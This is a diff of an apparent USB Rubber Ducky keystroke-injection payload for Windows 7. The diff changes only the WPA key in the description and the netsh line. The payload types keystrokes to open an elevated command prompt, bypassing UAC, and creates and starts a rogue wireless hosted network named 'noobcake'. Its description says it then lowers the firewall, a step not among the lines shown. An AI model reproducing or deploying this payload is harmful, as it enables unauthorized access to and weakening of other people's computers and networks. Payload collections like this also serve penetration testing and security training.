@@ -1,7 +1,7 @@
 Author: Darren Kitchen
 Duckencoder: 1.0
 Target: Windows 7
-Description: Open a CMD bypassing UAC then create a wireless access point with the SSID noobcake and WPA key 12345678, then lower firewall.
+Description: Open a CMD bypassing UAC then create a wireless access point with the SSID noobcake and WPA key 123456789, then lower firewall.
  CONTROL ESCAPE
  DELAY 200
  STRING cmd
@@ -13,7 +13,7 @@ Description: Open a CMD bypassing UAC then create a wireless access point with t
  LEFTARROW
  ENTER
  DELAY 200
- STRING netsh wlan set hostednetwork mode=allow ssid=noobcake key=12345678
+ STRING netsh wlan set hostednetwork mode=allow ssid=noobcake key=123456789
  ENTER
  DELAY 100
  STRING netsh wlan start hostednetwork
